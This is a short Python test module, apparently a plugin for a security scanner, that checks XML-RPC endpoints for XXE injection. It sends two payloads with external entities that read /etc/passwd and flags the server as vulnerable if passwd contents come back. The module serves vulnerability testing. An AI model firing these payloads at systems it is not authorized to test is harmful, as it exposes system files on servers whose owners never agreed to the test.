"""XML-RPC XXE Injection test"""
from ptlibs.ptprinthelper import ptprint
__TESTLABEL__ = "XML-RPC XXE Injection test"

class XXETest:
    def __init__(self, args, ptjsonlib, helpers, http_client, common_tests):
        self.args = args
        self.ptjsonlib = ptjsonlib
        self.helpers = helpers
        self.helpers.print_header(__TESTLABEL__)

    def run(self):
        payloads = [
            {"name": "file:///etc/passwd",
             "data": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodCall><methodName>&xxe;</methodName></methodCall>',
             "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"]},
            {"name": "file:///etc/passwd (in param)",
             "data": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodCall><methodName>ping</methodName><params><param><value>&xxe;</value></param></params></methodCall>',
             "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"]},
        ]
        for p in payloads:
            r = self.helpers.send_xmlrpc_raw(data=p["data"])
            if r and any(ind.lower() in r.text.lower() for ind in p["indicators"]):
                ptprint(f"XXE vulnerability detected ({p['name']})!", "VULN", not self.args.json, indent=4, colortext=True)
                self.ptjsonlib.add_vulnerability("PTV-XML-XXE", node_key=self.helpers.node_key,
                    data={"evidence": f"Payload: {p['name']}. Snippet: {r.text[:200]}"})
                return
        ptprint("Server appears safe from XXE.", "OK", not self.args.json, indent=4)

def run(args, ptjsonlib, helpers, http_client, common_tests):
    XXETest(args, ptjsonlib, helpers, http_client, common_tests).run()
